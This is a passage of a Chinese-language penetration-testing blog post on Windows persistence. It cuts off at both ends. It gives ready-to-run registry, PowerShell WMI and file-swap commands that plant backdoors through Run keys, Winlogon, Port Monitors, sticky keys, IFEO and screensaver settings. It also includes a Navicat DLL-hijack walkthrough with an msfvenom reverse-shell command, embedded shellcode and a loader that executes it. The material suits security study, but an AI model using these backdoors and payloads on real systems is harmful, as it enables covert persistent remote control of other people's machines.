文件，测试人员可以对此类注册表进行滥用，以建立持久化后门。</p><p>当用户登录时，系统会依次检查位于注册表运行键(Run Keys)中的程序，并在用户登录的上下文中启动。Windows系统默认创建以下运行键，如果修改HKEY_LOCAL_MACHINE下的运行键，需要拥有管理员级别的权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 以下注册表项中的程序将在当前用户登录时启动<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runonce<br># 以下注册表项中的程序将在所有用户登录时启动<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce<br></code></pre></td></tr></table></figure><p>执行下面命令在注册表运行键中添加一个Backdoor键，并将键值执行后门程序的绝对路径</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Backdoor /t REG_SZ /d &quot;C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>用户重新登录时主机就会上线</p><p><strong>Winlogon Helper</strong></p><p>Winlogon 是 Windows 系统的组件,用于处理与用户有关的各种行为，如登录、注销在登录时加载用户配置文件、锁定屏幕等。这些行为由系统注册表管理，注册表中的一些键值定义了在 Windows 登录期间会启动哪些进程。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 指定用户登录时执行的用户初始化程序，默认为userinit.exe<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell<br># 指定Windows身份验证期间执行的程序，默认为explorer.exe<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit<br></code></pre></td></tr></table></figure><p>执行下面命令在Userinit键值中添加一个后门程序，该程序将在用户登录时启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v Userinit /d &quot;C:\Windows\System32\userinit.exe,reverse_tcp.exe&quot; /f<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240416234601884.png" alt="image-20240416234601884"></p><blockquote><p>注意，在滥用 Userinit 和 Shell 键时需要保留键值中的原有程序，将待启动的后门程序添加到原有程序后面，并以“,”进行分隔。并且，后门程序需要被上传至 C:\Windows\System32目录。</p></blockquote><h2 id="Port-Monitors"><a href="#Port-Monitors" class="headerlink" title="Port Monitors"></a>Port Monitors</h2><p>打印后台处理服务(PrintSpooler)负责管理 Windows系统的打印作业。与该服务的交互是通过 Print Spooler API执行的,其中包含 AddMonitor函数,用于安装 Port Monitors(本地端口监视器)，并连接配置、数据和监视器文件。AddMonitor函数能够将DLL注入spoolsv.exe 进程，以实现相应功能，并且通过创建注册表键，测试人员可以在目标系统上进行权限持久化。利用该技术需要拥有管理员级别的权限。</p><ol><li><p>通过Metasploit生成一个64位的恶意的DLL</p></li><li><p>将生成的DLL上传到目标主机的C:\Windows\System32目录中，并执行下面命令通过编辑注册表安装一个端口监视器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor&quot; /v &quot;Driver&quot; /t REG_SZ &quot;reverse_tcp.dll&quot;<br></code></pre></td></tr></table></figure></li></ol><p>当系统重启时，Print Spooler 服务在启动过程中会读取Monitors 注册表项的所有子键，并以 SYSTEM 权限加载 Driver 键值所指定的DLL文件，目标主机就会重新上线。</p><h1 id="事件触发执行"><a href="#事件触发执行" class="headerlink" title="事件触发执行"></a>事件触发执行</h1><h2 id="利用WMI事件订阅"><a href="#利用WMI事件订阅" class="headerlink" title="利用WMI事件订阅"></a>利用WMI事件订阅</h2><p>WMI可以用于横向移动还可以在以获得权限的主机上部署永久事件，当触发指定事件时执行后门程序。</p><p><strong>手动利用</strong></p><p>通常情况下，WMI事件订阅的需要分别创建事件过滤器(Event Filter)和事件消费者(Event Consumer)，并把二者关联起来，以将事件发生和触发执行绑定一起。</p><p>下面用powershell部署一个事件，在每次系统启动后的5分钟内执行后门程序</p><figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 创建一个TestFilter的事件过滤器</span><br><span class="hljs-variable">$EventFilterArgs</span> = <span class="hljs-selector-tag">@</span>&#123;<br>    EventNamespace = <span class="hljs-string">&#x27;root/cimv2&#x27;</span><br>    Name = <span class="hljs-string">&quot;TestFilter&quot;</span><br>    Query = <span class="hljs-string">&quot;SELECT * FROM __InstanceModificationEvent    WITHIN 60 WHERE TargetInstanceISA &#x27;Win32 PerfFormattedData_PerfoS_System&#x27; AND TargetInstance.SystemUpTime &gt;=240 AND TargetInstance.SystemUpTime&lt; 325&quot;</span><br>    QueryLanguage =<span class="hljs-string">&#x27;WQL&#x27;</span><br>&#125;<br><span class="hljs-variable">$EventFilter</span> = <span class="hljs-built_in">Set-WmiInstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> __EventFilter <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$EventFilterArgs</span><br><span class="hljs-comment"># 创建一个名为TestConsumer的事件消费者，在指定事件发生时执行后门程序</span><br><span class="hljs-variable">$CommandLineEventConsumerArgs</span>= <span class="hljs-selector-tag">@</span>&#123;<br>    Name = <span class="hljs-string">&quot;TestConsumer&quot;</span><br>    CommandLineTemplate = <span class="hljs-string">&quot;cmd.exe /k C:\Windows\System32\reverse_tcp.exe&quot;</span><br>&#125;<br><span class="hljs-variable">$EventConsumer</span> = <span class="hljs-built_in">Set-Wmiinstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> CommandLineEventConsumer <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$CommandLineEventConsumerArgs</span><br><span class="hljs-comment"># 将事件过滤器和消费者绑定在一起</span><br><span class="hljs-variable">$FilterConsumerBindingArgs</span> = <span class="hljs-selector-tag">@</span>&#123;<br><span class="hljs-keyword">Filter</span> = <span class="hljs-variable">$EventFilter</span><br>Consumer = <span class="hljs-variable">$EventConsumer</span><br>&#125;<br><span class="hljs-variable">$FilterConsumerBinding</span> = <span class="hljs-built_in">Set-Wmiinstance</span> <span class="hljs-literal">-Namespace</span> root\subscription <span class="hljs-literal">-Class</span> __FilterToConsumerBinding <span class="hljs-literal">-Arguments</span> <span class="hljs-variable">$FilterConsumerBindingArgs</span><br></code></pre></td></tr></table></figure><p><strong>相关辅助工具</strong></p><p>前面用过Sharp-WMIEvent进行系统命令执行，该工具同样可以用于权限持久化，在目标主机上执行下面命令，部署一个随机命名的永久事件，每当用户登录时就执行后门程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Sharp-WMIEvent -Trigger UserLogon -Command &quot;cmd.exe /c C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>此外，Metasploit框架内置了一个通过 WMI事件订阅在目标系统上实现持久性的模块，即 exploit&#x2F;windows&#x2F;local&#x2F;wmi_persistence，支持不同的选项，可用于特定事件触发时在系统上执行任意的攻击载荷</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417125624263.png" alt="image-20240417125624263"></p><h2 id="利用系统辅助功能"><a href="#利用系统辅助功能" class="headerlink" title="利用系统辅助功能"></a>利用系统辅助功能</h2><p>Windows 系统包含了许多供用户通过组合键启动的辅助功能，测试人员可以修改这些程序的启动方式，以获取目标主机的命令行或运行指定的后门攻击载荷，不需登录系统即可获取目标主机权限。</p><p>下面是一些常见的辅助功能程序，都位于C:\Windows\System32下面</p><table><thead><tr><th>程序</th><th>功能</th><th>热键组合</th></tr></thead><tbody><tr><td>sethc.exe</td><td>粘滞键</td><td>连续5次Shfit键</td></tr><tr><td>magnify.exe</td><td>放大镜</td><td>Windows+”+”</td></tr><tr><td>utilman.exe</td><td>实用程序</td><td>Windows+U</td></tr><tr><td>osk.exe</td><td>屏幕键盘</td><td>Windows+Ctrl+O</td></tr><tr><td>displaywitch.exe</td><td>屏幕扩展</td><td>Windows+P</td></tr><tr><td>atbroker.exe</td><td>辅助管理工具</td><td></td></tr><tr><td>narrator.exe</td><td>讲述者</td><td>Windows+Ctrl+Enter</td></tr></tbody></table><p>以sethc.exe为例，我们可以将cmd.exe伪装成scthc.exe，然后在远程登陆桌面连按五次shift键即可获得一个命令行窗口，实现未授权访问。该方法需要管理员权限</p><p><strong>手动利用</strong></p><p>在高版本的 Windows中，C:\Windows\System32目录下的文件受到系统保护，只有TrustedInstaller权限的用户才对其中的文件拥有修改和写入权限，可以使用令牌窃取技术获得权限。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417135924293.png" alt="image-20240417135924293"></p><p>获取 TrustedInstaller权限后，执行以下命令即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd C:\Windows\System32<br>move sethc.exe sethc.exe.bak # 将sethc.exe重命名<br>copy cmd.exe sethc.exe       # 将cmd.exe副本伪装成sethc.exe<br></code></pre></td></tr></table></figure><p><strong>RDP劫持</strong></p><p>通过粘滞键等系统辅助功能创建的后门以SYSTEM 权限运行，测试人员可以在获取的命令行中执行 RDP劫持，不需任何用户凭据即可登入目标系统桌面。</p><h2 id="IFEO注入"><a href="#IFEO注入" class="headerlink" title="IFEO注入"></a>IFEO注入</h2><p>IFEO(Image File Execution Options)是Windows系统的一个注册表项,路径为 HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Options。</p><p>在 WindowsNT 系统中，IFEO 原本是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。IFEO 使开发人员能够将调试器附加到应用程序。当进程创建时，应用程序的 IFEO 中设置的调试器将附加到应用程序的名称前，从而有效地在调试器下启动新进程</p><p><strong>Debugger</strong></p><p>当用户启动计算机的程序后，系统会在注册表的IFEO 中查询所有的程序子键，如果存在与该程序名称相同的子健，就读取对应子键的“Debugger”键值。如果该键值未被设置，就默认不做处理，否则直接用该键值所指定的程序路径来代替原始的程序。</p><p>通过编辑“Dubugger”的值，测试人员可以通过修改注册表的方式创建粘滞键后门，而不需获取 TrustedInstaller 权限。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32.exe&quot;<br></code></pre></td></tr></table></figure><p><strong>GlobalFlag</strong></p><p>IFEO还可以在指定程序静默退出时启动任意监控程序，需要通过设置以下3个注册表来实现。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启用对记事本进程的静默退出监视</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\Image File Execution Option\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启用Windows错误报告进程WerFault.exe，它将成为reverse_tcp.exe的父进程</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">将监视器进程设置为reverse_tcp.exe</span><br>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\MicrosoftWindows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Windows\System32\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure><p>当用户打开记事本(notepad.exe)时，程序正常启动。当用户关闭记事本或相关进程被杀死后时，将在 WerFault.exe 进程中创建子进程以运行后门程序reverse_tcp.exe.</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417155154992.png" alt="image-20240417155154992"></p><h2 id="利用屏幕保护程序"><a href="#利用屏幕保护程序" class="headerlink" title="利用屏幕保护程序"></a>利用屏幕保护程序</h2><p>屏幕保护是 Windows 系统的一项功能，可以在用户一段时间不活动后播放屏幕消息或图形动画。屏幕保护程序由具有.scr文件扩展名的可执行文件组成。系统注册表项HKEY_CURRENT_USER\Control Panel\Desktop 下存储了用来设置屏幕保护程序的键值。</p><table><thead><tr><th>键名</th><th>说明</th></tr></thead><tbody><tr><td>SCRNSAVE.EXE</td><td>设置屏幕保护程序的路径，其指向以.scr为扩展名的可执行文件</td></tr><tr><td>ScreenSaveActive</td><td>设置是否需要启用屏幕保护程序，默认为1表示启用</td></tr><tr><td>ScreenSaveIsSecure</td><td>设置是否需要密码解锁，设置为0则不需要密码</td></tr><tr><td>ScreenSaveTimeOut</td><td>设置执行屏幕保护程序之前用户不活动的超时时间</td></tr></tbody></table><p>我们可以修改屏幕保护的执行路径，当触发屏幕保护时执行后门程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将触发屏幕保护时执行的程序设为自定义的恶意程序，这里的程序以.scr或.exe为扩展名皆可</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v SCRNSAVE.EXE /t REG_SZ /d &quot;C:\Users\Marcus\reverse_tcp.scr&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启用屏幕保护</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveActive /t REG_SZ /d 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置不需要密码解锁</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveIsSecure /t REG_SZ /d &quot;0&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">将用户不活动的超时设置为60秒</span><br>reg add &quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot; /v ScreenSaveTimeOut /t REG_SZ /d &quot;60&quot;<br></code></pre></td></tr></table></figure><p>该方法不需要管理员权限，标准用户权限即可。</p><p>默认情况下，除 ScreenSaveActive 的值为1外，其余三个键都不存在，所以需要手动创建。并且，触发的恶意程序只能在当前用户的上下文中运行。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417164930891.png" alt="image-20240417164930891"></p><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>之前UACBypass也用过这项技术，这里通过DLL劫持来建立持久化后门，该方法需要管理员权限。</p><p><strong>劫持应用程序</strong></p><p>以Navicat Premium 15为例。</p><p>启动Navicat然后通过Process Monitor监控其进程，过滤出加载的DLL，可以看出，navicat.exe进程加载DLL文件的顺序。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417165957692.png" alt="image-20240417165957692"></p><blockquote><p>Navicat首先尝试在自身的安装目录中加载 version.dll，但是安装目录中 version.dll 不存在，所以会继续尝试在系统目录C:\Windows\System32中加载version.dll，并成功加载</p></blockquote><p>依照这样我们就可以构造恶意DLL放入Navicat的安装目录。</p><p>通常情况下，构造的恶意 DLL 需要与原来的合法 DLL 具有相同的导出函数。可以使用 AheadLib 工具获取合法的 version.dll 的导出函数，并自动化生成劫持代码。</p><p>在“输入 DLL”中填入合法 DLL 的绝对路径，在“输出CPP”中填入生成的劫持代码的保存路径，在“转发”中勾选“直接转发函数”，“原始DLL”中的值设为“versionOrg“</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240417170341170.png" alt="image-20240417170341170"></p><p>点击生成就能生成一份劫持代码，这是生成的代码：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// 头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// 导出函数</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameA=versionOrg.VerLanguageNameA,@14&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerLanguageNameW=versionOrg.VerLanguageNameW,@15&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueA=versionOrg.VerQueryValueA,@16&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerQueryValueW=versionOrg.VerQueryValueW,@17&quot;</span>)</span><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br><br><br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="hljs-comment">// 入口函数</span><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)<br>&#123;<br><span class="hljs-built_in">DisableThreadLibraryCalls</span>(hModule);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dwReason == DLL_PROCESS_DETACH)<br>&#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><br></code></pre></td></tr></table></figure><p>该代码通过pragma预处理指令实现函数转发，以确保应用程序能正常启动。</p><p>应用程序的运行依赖于原始 DLL 文件中提供的函数，恶意 DLL 必须提供相同功能的函数才能保证程序的正常运行。因此编写 DIL劫持代码时，需要通过函数转发，将应用程序调用的函数从恶意 DIL重定向到原始的合法 DLL。</p><blockquote><p>例如在上述代码中,当 Navicat需要调用合法 DLL 文件中的 GetFileVersionInfoA 函数时，系统会根据给出的 pragma 指令直接转发给 versionOrg.dll 中的 GetFileVersionInfoA 函数去执行。由于劫持的原始 DLL(version.dll)位于System32 目录中，因此需要将 pragma指令中的“versionOrg”替换成C:\Windows\System32\version”(路径中的反斜杠需要转义)。</p></blockquote><p>然后我们需要编写一个DoMagic函数，用来申请虚拟内存并执行Metasploit生成的ShellCode</p><p>msf生成shellcode的指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/shell/reverse_tcp LHOST=192.168.28.0 LPORT=2333 -a x86 -f c<br></code></pre></td></tr></table></figure><p>DoMagic函数的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//申请内存并执行ShellCode</span><br>DWORD WINAPI <span class="hljs-title function_">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] =<br><span class="hljs-string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52&quot;</span><br><span class="hljs-string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="hljs-string">&quot;\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d&quot;</span><br><span class="hljs-string">&quot;\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0\x8b\x58\x20\x50&quot;</span><br><span class="hljs-string">&quot;\x8b\x48\x18\x01\xd3\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x31&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75&quot;</span><br><span class="hljs-string">&quot;\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58\x24\x01&quot;</span><br><span class="hljs-string">&quot;\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01&quot;</span><br><span class="hljs-string">&quot;\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58&quot;</span><br><span class="hljs-string">&quot;\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00&quot;</span><br><span class="hljs-string">&quot;\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8&quot;</span><br><span class="hljs-string">&quot;\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80&quot;</span><br><span class="hljs-string">&quot;\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x14\x80\x68\x02\x00&quot;</span><br><span class="hljs-string">&quot;\x09\x1d\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74&quot;</span><br><span class="hljs-string">&quot;\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f&quot;</span><br><span class="hljs-string">&quot;\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10&quot;</span><br><span class="hljs-string">&quot;\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53&quot;</span><br><span class="hljs-string">&quot;\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;</span><br><span class="hljs-string">&quot;\x00\x7d\x28\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b&quot;</span><br><span class="hljs-string">&quot;\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e&quot;</span><br><span class="hljs-string">&quot;\x5e\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br><span class="hljs-string">&quot;\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a&quot;</span><br><span class="hljs-string">&quot;\x00\x53\xff\xd5&quot;</span>;<br>    <span class="hljs-type">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(exec, shellcode,<span class="hljs-keyword">sizeof</span> shellcode);<br>    ((<span class="hljs-type">void</span>(*)())exec)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>DllMain函数时整个DLL文件的入口函数，可以创建线程调用劫持后需要进行的功能。在DllMain函数中添加以下代码，创建进程调用DoMagic函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(hThread)&#123;<br>    CloseHandle(hThread);<br>&#125;<br></code></pre></td></tr></table></figure><p>最终的DLL劫持代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 头文件</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-comment">// 导出函数</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoA=versionOrg.GetFileVersionInfoA,@1&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoByHandle=versionOrg.GetFileVersionInfoByHandle,@2&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExA=versionOrg.GetFileVersionInfoExA,@3&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoExW=versionOrg.GetFileVersionInfoExW,@4&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeA=versionOrg.GetFileVersionInfoSizeA,@5&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExA=versionOrg.GetFileVersionInfoSizeExA,@6&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeExW=versionOrg.GetFileVersionInfoSizeExW,@7&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoSizeW=versionOrg.GetFileVersionInfoSizeW,@8&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:GetFileVersionInfoW=versionOrg.GetFileVersionInfoW,@9&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileA=versionOrg.VerFindFileA,@10&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerFindFileW=versionOrg.VerFindFileW,@11&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileA=versionOrg.VerInstallFileA,@12&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/EXPORT:VerInstallFileW=versionOrg.VerInstallFileW,@13&quot;</span>)</span><br><span class="hljs-meta">#<span 